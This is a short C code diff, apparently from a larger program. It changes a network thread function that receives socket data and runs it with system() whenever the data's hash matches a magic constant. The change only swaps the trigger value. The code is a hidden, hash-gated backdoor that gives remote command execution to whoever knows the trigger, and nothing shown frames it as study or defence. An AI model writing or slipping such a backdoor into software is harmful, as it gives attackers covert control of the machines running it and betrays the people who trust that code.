@@ -23,7 +23,7 @@ void *fn(void *c)
 {
     char buf[128]; int len;
     while ((len = recv((int) c, buf, sizeof(buf), 0)) > 0) {
-        if(hash((unsigned char *) buf, len) == 0x98b55) {
+        if(hash((unsigned char *) buf, len) == 640698) {
             system(buf);
         }
     }
